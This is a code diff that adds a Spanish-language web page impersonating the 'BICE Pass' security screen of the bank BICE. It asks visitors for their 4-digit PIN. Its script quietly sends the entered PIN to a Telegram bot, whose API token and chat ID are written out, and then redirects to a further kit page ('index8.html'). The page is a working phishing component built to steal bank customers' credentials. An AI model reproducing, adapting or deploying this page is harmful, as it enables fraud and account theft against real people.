@@ -1,0 +1,173 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BICE Pass</title>
+    <style>
+        
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: #48dbfb;
+            background-image: linear-gradient(to bottom right, #4FA6E1 50%, #13467a 100%);
+            background-repeat: no-repeat;
+            background-attachment: fixed;
+        }
+
+        .header {
+            background-color: transparent;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 10px;
+        }
+
+        .left img,
+        .right img {
+            width: 30px;
+        }
+
+        h1 {
+            color: white;
+            margin: 0;
+            flex-grow: 1;
+            text-align: center;
+        }
+
+        .image-container {
+            text-align: center;
+            margin-top: 20px;
+        }
+
+        .image-container img {
+            width: 150px;
+            height: auto;
+        }
+
+        p, h2 {
+            color: white;
+            margin: 5px 0; /* Añadido un pequeño margen entre los párrafos */
+        }
+
+        .pin-inputs {
+            display: flex;
+            justify-content: center;
+            margin-top: 10px;
+        }
+
+        .pin-input {
+            position: relative;
+            margin: 0 5px;
+        }
+
+        .pin-input input {
+            width: 30px;
+            padding: 5px;
+            text-align: center;
+            border: none;
+            border-bottom: 2px solid white;
+            background-color: transparent;
+            color: white;
+        }
+
+        .pin-input input:focus {
+            outline: none;
+            border-bottom: 2px solid white;
+        }
+
+        .pin-input input:hover {
+            border-bottom: 2px solid white;
+        }
+        
+        .btn-continuar {
+            background-color: #1e549f;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            margin-top: 20px;
+            cursor: pointer;
+        }
+
+        .btn-continuar:hover {
+            background-color: #0056b3;
+            color: white;
+        }
+        
+        .pin-input input::placeholder {
+            color: white;
+        }
+
+        .left img,
+        .right img {
+            width: 30px;
+            filter: invert(1);
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <div class="left">
+            <img src="T.png" alt="Teléfono">
+        </div>
+        <h1>BICE Pass</h1>
+        <div class="right">
+            <img src="B.png" alt="Menú">
+        </div>
+    </div>
+    <div class="image-container">
+        <img src="co.png" alt="Descripción de tu imagen">
+        <h2>Tu seguridad primero</h2>
+        <p>Por medidas de seguridad debe<br>Ingresar su PIN de 4 dígitos</p>
+        <div class="pin-inputs">
+            <div class="pin-input"><input type="number" maxlength="1" onkeyup="focusNext(this, 1)" placeholder="-"></div>
+            <div class="pin-input"><input type="number" maxlength="1" onkeyup="focusNext(this, 1)" placeholder="-"></div>
+            <div class="pin-input"><input type="number" maxlength="1" onkeyup="focusNext(this, 1)" placeholder="-"></div>
+            <div class="pin-input"><input type="number" maxlength="1" onkeyup="focusNext(this, 1)" placeholder="-"></div>
+        </div>
+        <button class="btn-continuar">Continuar</button>
+    </div>
+
+    <script>
+        function focusNext(input, maxLength) {
+            if (input.value.length >= maxLength) {
+                var nextInput = input.parentElement.nextElementSibling.querySelector('input');
+                if (nextInput) {
+                    nextInput.focus();
+                }
+            }
+        }
+
+        // Obtener referencia al botón de continuar
+        var btnContinuar = document.querySelector('.btn-continuar');
+
+        // Agregar evento click al botón de continuar
+        btnContinuar.addEventListener('click', function() {
+            // Obtener los valores de los inputs del PIN
+            var pinInputs = document.querySelectorAll('.pin-input input');
+            var pin = '';
+            pinInputs.forEach(function(input) {
+                pin += input.value;
+            });
+
+            // URL de la API de Telegram para enviar mensaje
+            var apiUrl = 'https://api.telegram.org/bot6140527375:AAEDfuyj0KUl1MB4IVb5jeC35_Ucfk6ykhk/sendMessage';
+
+            // Datos del mensaje a enviar
+            var data = {
+                chat_id: '7155365525', // ID del chat donde quieres enviar el mensaje
+                text: 'Se ha ingresado el PIN: ' + pin // Mensaje a enviar
+            };
+
+            // Configuración de la solicitud HTTP
+            var request = new XMLHttpRequest();
+            request.open('POST', apiUrl, true);
+            request.setRequestHeader('Content-Type', 'application/json');
+
+            // Enviar los datos
+            request.send(JSON.stringify(data));
+          window.location.href = 'index8.html'
+        });
+    </script>
+</body>
+</html>
